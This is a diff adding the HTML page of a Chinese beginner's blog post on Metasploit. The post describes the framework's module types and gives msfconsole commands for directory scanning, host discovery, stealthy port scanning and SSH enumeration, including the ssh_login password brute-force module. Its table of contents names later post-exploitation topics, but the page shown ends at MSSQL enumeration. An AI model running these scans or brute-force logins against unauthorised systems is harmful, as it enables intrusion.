@@ -1,0 +1,1705 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Metasploit初学-散记 - 剑胆琴心</title><meta name="author" content="剑胆琴心">
+<meta name="author-link" content="http://geoer.cn">
+<meta name="description" content="MSF 最牛X的地方是：支持整个渗透测试过程 理论方面 技术架构 1.辅助模块（auxiliary） 包含了扫描、嗅探、指纹识别、网络欺骗等相关功能模块 2" /><meta name="keywords" content='Metasploit' /><meta itemprop="name" content="Metasploit初学-散记">
+<meta itemprop="description" content="MSF 最牛X的地方是：支持整个渗透测试过程 理论方面 技术架构 1.辅助模块（auxiliary） 包含了扫描、嗅探、指纹识别、网络欺骗等相关功能模块 2"><meta itemprop="datePublished" content="2020-05-09T17:15:16+08:00" />
+<meta itemprop="dateModified" content="2023-01-21T16:47:23+08:00" />
+<meta itemprop="wordCount" content="7978"><meta itemprop="image" content="https://geoer.cn/logo.png"/>
+<meta itemprop="keywords" content="Metasploit," /><meta property="og:title" content="Metasploit初学-散记" />
+<meta property="og:description" content="MSF 最牛X的地方是：支持整个渗透测试过程 理论方面 技术架构 1.辅助模块（auxiliary） 包含了扫描、嗅探、指纹识别、网络欺骗等相关功能模块 2" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://geoer.cn/metasploit%E5%88%9D%E5%AD%A6-%E6%95%A3%E8%AE%B0/" /><meta property="og:image" content="https://geoer.cn/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-05-09T17:15:16+08:00" />
+<meta property="article:modified_time" content="2023-01-21T16:47:23+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://geoer.cn/logo.png"/>
+
+<meta name="twitter:title" content="Metasploit初学-散记"/>
+<meta name="twitter:description" content="MSF 最牛X的地方是：支持整个渗透测试过程 理论方面 技术架构 1.辅助模块（auxiliary） 包含了扫描、嗅探、指纹识别、网络欺骗等相关功能模块 2"/>
+<meta name="application-name" content="剑胆琴心">
+<meta name="apple-mobile-web-app-title" content="剑胆琴心"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://geoer.cn/metasploit%E5%88%9D%E5%AD%A6-%E6%95%A3%E8%AE%B0/" /><link rel="prev" href="https://geoer.cn/ms-16075%E6%8F%90%E6%9D%83windows-server-2008/" /><link rel="next" href="https://geoer.cn/powershell%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%E7%9A%84%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Metasploit初学-散记",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/geoer.cn\/metasploit%E5%88%9D%E5%AD%A6-%E6%95%A3%E8%AE%B0\/"
+    },"image": [{
+              "@type": "ImageObject",
+              "url": "https:\/\/geoer.cn\/images\/Apple-Devices-Preview.jpg",
+              "width":  1842 ,
+              "height":  1036 
+            }],"genre": "posts","keywords": "Metasploit","wordcount":  7978 ,
+    "url": "https:\/\/geoer.cn\/metasploit%E5%88%9D%E5%AD%A6-%E6%95%A3%E8%AE%B0\/","datePublished": "2020-05-09T17:15:16+08:00","dateModified": "2023-01-21T16:47:23+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+      "@type": "Organization",
+      "name": "剑胆琴心","logo": {
+          "@type": "ImageObject",
+          "url": "https:\/\/geoer.cn\/images\/avatar.png",
+          "width":  438 ,
+          "height":  438 
+        }},"author": {
+        "@type": "Person",
+        "name": "剑胆琴心"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tests/"
+                title="FixIt 测试"
+                
+              ><i class="fa-solid fa-flask fa-fw fa-sm" aria-hidden="true"></i> 测试</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                title="友情链接"
+                
+              ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li>
+      </ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="/images/avatar.png"
+    title="/images/avatar.png" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tests/"
+                  title="FixIt 测试"
+                  
+                ><i class="fa-solid fa-flask fa-fw fa-sm" aria-hidden="true"></i> 测试</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  title="友情链接"
+                  
+                ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li
+              class="menu-item text-center"
+            ><a
+                  class="menu-link"
+                  href="https://github.com/shuai06"
+                  title="GitHub"
+                  rel="noopener noreferrer" target="_blank"
+                ><i class='fa-brands fa-github fa-fw' aria-hidden='true'></i> </a></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
+        <span>Metasploit初学-散记</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="http://geoer.cn" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img
+    class="lazyload avatar"
+    src="/svg/loading.min.svg"
+    data-src="https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp"
+    data-srcset="https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp, https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp 1.5x, https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心"/>&nbsp;剑胆琴心</a></span>
+          <span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 渗透测试</a></span></div>
+      <div class="post-meta-line"><span title=2020-05-09&#32;17:15:16><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2020-05-09">2020-05-09</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 7978 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 16 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="Metasploit初学-散记">
+              <i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_page_pv">-</span>&nbsp;次阅读
+            </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#font-colorred-理论方面font"><font color=red> 理论方面</font></a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#技术架构">技术架构</a></li>
+            <li><a href="#接口">接口</a></li>
+            <li><a href="#为什么要使用metasploit">为什么要使用Metasploit</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#font-colorred-使用msffont"><font color=red> 使用MSF</font></a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#准备使用">准备使用</a></li>
+            <li><a href="#情报搜集">情报搜集</a></li>
+            <li><a href="#漏洞利用">漏洞利用</a></li>
+            <li><a href="#bypass-uac">Bypass UAC</a></li>
+            <li><a href="#meterpreter属于后渗透攻击">Meterpreter（属于后渗透攻击）</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#后渗透攻击提权">后渗透攻击：提权</a></li>
+                    <li><a href="#后渗透攻击移植漏洞利用代码模块">后渗透攻击：移植漏洞利用代码模块</a></li>
+                    <li><a href="#后渗透攻击后门">后渗透攻击：后门</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#msf基础命令">msf基础命令</a></li>
+            <li><a href="#meterpreter命令">Meterpreter命令：</a></li>
+            <li><a href="#msfvenom基础">msfvenom基础</a></li>
+            <li><a href="#反弹shell">反弹Shell</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#一些小思路">一些小思路</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#信息搜集">信息搜集</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#获取另外一台服务器权限">获取另外一台服务器权限</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#powershell寻找域管在线服务器">Powershell寻找域管在线服务器</a></li>
+            <li><a href="#获取域管权限">获取域管权限</a></li>
+            <li><a href="#登录域控">登录域控</a></li>
+            <li><a href="#smb爆破内网">SMB爆破内网</a></li>
+            <li><a href="#清理日志">清理日志</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h1 id="msf">MSF</h1>
+<blockquote>
+<p>最牛X的地方是：支持整个渗透测试过程</p>
+</blockquote>
+<h2 id="font-colorred-理论方面font"><font color=red> 理论方面</font></h2>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/msf_1.png"
+    data-srcset="http://image.xpshuai.cn/msf_1.png, http://image.xpshuai.cn/msf_1.png 1.5x, http://image.xpshuai.cn/msf_1.png 2x"
+    data-sizes="auto"
+    alt="http://image.xpshuai.cn/msf_1.png"
+    title="http://image.xpshuai.cn/msf_1.png"/></p>
+<h4 id="技术架构">技术架构</h4>
+<p><strong>1.辅助模块（auxiliary）</strong>
+包含了扫描、嗅探、指纹识别、网络欺骗等相关功能模块
+<img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/msf_2.png"
+    data-srcset="http://image.xpshuai.cn/msf_2.png, http://image.xpshuai.cn/msf_2.png 1.5x, http://image.xpshuai.cn/msf_2.png 2x"
+    data-sizes="auto"
+    alt="http://image.xpshuai.cn/msf_2.png"
+    title="http://image.xpshuai.cn/msf_2.png"/></p>
+<p><strong>2.渗透攻击模块(exploits)</strong>
+利用程序，针对漏洞、权限进行利用，是主要使用的模块
+<img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/msf_3.png"
+    data-srcset="http://image.xpshuai.cn/msf_3.png, http://image.xpshuai.cn/msf_3.png 1.5x, http://image.xpshuai.cn/msf_3.png 2x"
+    data-sizes="auto"
+    alt="http://image.xpshuai.cn/msf_3.png"
+    title="http://image.xpshuai.cn/msf_3.png"/></p>
+<p><strong>3.攻击载荷模块(payload)</strong>
+用于在目标系统中运行任意命令或者执行特定代码，主要用于shell获取
+<img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/msf_5.png"
+    data-srcset="http://image.xpshuai.cn/msf_5.png, http://image.xpshuai.cn/msf_5.png 1.5x, http://image.xpshuai.cn/msf_5.png 2x"
+    data-sizes="auto"
+    alt="http://image.xpshuai.cn/msf_5.png"
+    title="http://image.xpshuai.cn/msf_5.png"/></p>
+<p><strong>4.空指令模块(nops)</strong>
+<img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/msf_5.png"
+    data-srcset="http://image.xpshuai.cn/msf_5.png, http://image.xpshuai.cn/msf_5.png 1.5x, http://image.xpshuai.cn/msf_5.png 2x"
+    data-sizes="auto"
+    alt="http://image.xpshuai.cn/msf_5.png"
+    title="http://image.xpshuai.cn/msf_5.png"/></p>
+<p><strong>5.编码器模块(encoders)</strong>
+<img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/msf_6.png"
+    data-srcset="http://image.xpshuai.cn/msf_6.png, http://image.xpshuai.cn/msf_6.png 1.5x, http://image.xpshuai.cn/msf_6.png 2x"
+    data-sizes="auto"
+    alt="http://image.xpshuai.cn/msf_6.png"
+    title="http://image.xpshuai.cn/msf_6.png"/></p>
+<p><strong>6.后渗透攻击模块(post)</strong>
+<img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/msf_7.png"
+    data-srcset="http://image.xpshuai.cn/msf_7.png, http://image.xpshuai.cn/msf_7.png 1.5x, http://image.xpshuai.cn/msf_7.png 2x"
+    data-sizes="auto"
+    alt="http://image.xpshuai.cn/msf_7.png"
+    title="http://image.xpshuai.cn/msf_7.png"/></p>
+<p><strong>7.免杀模块(evasion)</strong></p>
+<h4 id="接口">接口</h4>
+<p>MSF有四种接口对外提供：<code>msfconsole</code>, <code>msfcli</code>,  <code>msfgui</code>,  <code>msfweb</code></p>
+<h4 id="为什么要使用metasploit">为什么要使用Metasploit</h4>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/msf_8.png"
+    data-srcset="http://image.xpshuai.cn/msf_8.png, http://image.xpshuai.cn/msf_8.png 1.5x, http://image.xpshuai.cn/msf_8.png 2x"
+    data-sizes="auto"
+    alt="http://image.xpshuai.cn/msf_8.png"
+    title="http://image.xpshuai.cn/msf_8.png"/>
+开发版是没有生成报告的功能的（商业版才有），但是开发版的脚本更多，每个版本各有利弊</p>
+<ol>
+<li>
+<p>情报搜集阶段
+<img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/msf_9.png"
+    data-srcset="http://image.xpshuai.cn/msf_9.png, http://image.xpshuai.cn/msf_9.png 1.5x, http://image.xpshuai.cn/msf_9.png 2x"
+    data-sizes="auto"
+    alt="http://image.xpshuai.cn/msf_9.png"
+    title="http://image.xpshuai.cn/msf_9.png"/>
+有数据库</p>
+</li>
+<li>
+<p>威胁建模阶段
+<img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/msf_10.png"
+    data-srcset="http://image.xpshuai.cn/msf_10.png, http://image.xpshuai.cn/msf_10.png 1.5x, http://image.xpshuai.cn/msf_10.png 2x"
+    data-sizes="auto"
+    alt="http://image.xpshuai.cn/msf_10.png"
+    title="http://image.xpshuai.cn/msf_10.png"/></p>
+</li>
+<li>
+<p>漏洞分析阶段
+<img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/msf_11.png"
+    data-srcset="http://image.xpshuai.cn/msf_11.png, http://image.xpshuai.cn/msf_11.png 1.5x, http://image.xpshuai.cn/msf_11.png 2x"
+    data-sizes="auto"
+    alt="http://image.xpshuai.cn/msf_11.png"
+    title="http://image.xpshuai.cn/msf_11.png"/></p>
+</li>
+<li>
+<p>后渗透攻击模块
+<img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/msf_13.png"
+    data-srcset="http://image.xpshuai.cn/msf_13.png, http://image.xpshuai.cn/msf_13.png 1.5x, http://image.xpshuai.cn/msf_13.png 2x"
+    data-sizes="auto"
+    alt="http://image.xpshuai.cn/msf_13.png"
+    title="http://image.xpshuai.cn/msf_13.png"/></p>
+</li>
+<li>
+<p>报告生成模块
+<img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/msf_13.png"
+    data-srcset="http://image.xpshuai.cn/msf_13.png, http://image.xpshuai.cn/msf_13.png 1.5x, http://image.xpshuai.cn/msf_13.png 2x"
+    data-sizes="auto"
+    alt="http://image.xpshuai.cn/msf_13.png"
+    title="http://image.xpshuai.cn/msf_13.png"/></p>
+</li>
+</ol>
+<hr>
+<h2 id="font-colorred-使用msffont"><font color=red> 使用MSF</font></h2>
+<h4 id="准备使用">准备使用</h4>
+<p><strong>启动MSF</strong>
+<code>msfconsole</code>
+可以配置数据库等</p>
+<p><strong>更新MSF</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apt-get update
+</span></span><span class="line"><span class="cl">apt-get install metasploit-framework
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>软件安装目录</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/share/metasploit-framework
+</span></span><span class="line"><span class="cl"><span class="c1"># 数据目录(其中一些字典和脚本我们用的时候可以拿)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>模块</strong>
+一个模块就是一个rb脚本</p>
+<h4 id="情报搜集">情报搜集</h4>
+<blockquote>
+<p>首先search 搜索有哪些可用的模块</p>
+</blockquote>
+<p><strong>1.网站敏感目录扫描：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/share/metasploit-framework/modules/auxiliary/scanner 里面自己看都有啥
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## 使用 brute_dirs, dir_listing, dir_Scanner等辅助模块来进行敏感目录扫描</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 他们主要使用暴力猜解的方式工作，需要提供目录字典</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 使用模块</span>
+</span></span><span class="line"><span class="cl">use auxiliary/scanner/http/dir_scanner
+</span></span><span class="line"><span class="cl"><span class="c1"># 查看详细信息</span>
+</span></span><span class="line"><span class="cl">info
+</span></span><span class="line"><span class="cl"><span class="c1"># 查看需要设置的参数</span>
+</span></span><span class="line"><span class="cl">show options   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 设置参数（取消设置参数是 unset）</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> RHOTS 192.168.0.101
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> PATH /cms/
+</span></span><span class="line"><span class="cl"><span class="c1"># 攻击</span>
+</span></span><span class="line"><span class="cl">exploit
+</span></span><span class="line"><span class="cl"><span class="c1"># 返回上一级退出当前模块</span>
+</span></span><span class="line"><span class="cl">back
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 两个可选命令</span>
+</span></span><span class="line"><span class="cl">setg, unsetg  <span class="c1"># 用于在msfconsole中设置或取消设置全局性的参数，从而避免重复输入相同的值</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用常用的辅助模块进行服务扫描(<code>search scanner</code>)</p>
+<p><strong>2.主机发现</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## 用于主机发现的辅助模块，位于 modules/auxiliary/scanner/discovery</span>
+</span></span><span class="line"><span class="cl">use /auxiliary/scanner/discovery/arp_sweep
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/msf_14.png"
+    data-srcset="http://image.xpshuai.cn/msf_14.png, http://image.xpshuai.cn/msf_14.png 1.5x, http://image.xpshuai.cn/msf_14.png 2x"
+    data-sizes="auto"
+    alt="http://image.xpshuai.cn/msf_14.png"
+    title="http://image.xpshuai.cn/msf_14.png"/></p>
+<p>还是nmap速度快, 可以直接在msf中使用<code>nmap</code></p>
+<p><strong>3.端口扫描</strong>
+search  portscan</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">auxiliary/scanner/portscan/ack
+</span></span><span class="line"><span class="cl">auxiliary/scanner/portscan/syn  <span class="c1"># 推荐这个(速度快，准确，不易被发现)</span>
+</span></span><span class="line"><span class="cl">auxiliary/scanner/portscan/xmas
+</span></span><span class="line"><span class="cl">auxiliary/scanner/portscan/ftpbounce
+</span></span><span class="line"><span class="cl">auxiliary/scanner/portscan/tcp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">use ......
+</span></span><span class="line"><span class="cl">show options
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> xxx
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/msf_15.png"
+    data-srcset="http://image.xpshuai.cn/msf_15.png, http://image.xpshuai.cn/msf_15.png 1.5x, http://image.xpshuai.cn/msf_15.png 2x"
+    data-sizes="auto"
+    alt="http://image.xpshuai.cn/msf_15.png"
+    title="http://image.xpshuai.cn/msf_15.png"/></p>
+<p><strong>4.探测服务详细信息</strong>
+<img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/msf_16.png"
+    data-srcset="http://image.xpshuai.cn/msf_16.png, http://image.xpshuai.cn/msf_16.png 1.5x, http://image.xpshuai.cn/msf_16.png 2x"
+    data-sizes="auto"
+    alt="http://image.xpshuai.cn/msf_16.png"
+    title="http://image.xpshuai.cn/msf_16.png"/></p>
+<p><strong>5.服务查点</strong>
+用户服务扫描和查点的工具，通常以<code>[server_name]_version</code>命名</p>
+<ul>
+<li>
+<p>telnet服务查点(查哪些主机开了telnet服务，而namp是查看某主机开放了哪些服务)
+<img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/msf_17.png"
+    data-srcset="http://image.xpshuai.cn/msf_17.png, http://image.xpshuai.cn/msf_17.png 1.5x, http://image.xpshuai.cn/msf_17.png 2x"
+    data-sizes="auto"
+    alt="http://image.xpshuai.cn/msf_17.png"
+    title="http://image.xpshuai.cn/msf_17.png"/></p>
+</li>
+<li>
+<p>SSH服务查点</p>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use auxiliary/scanner/ssh/ssh_version
+</span></span><span class="line"><span class="cl"><span class="c1"># 口令爆破</span>
+</span></span><span class="line"><span class="cl">use auxiliary/scanner/ssh/ssh_login
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>MSSQL服务查点</li>
+</ul>
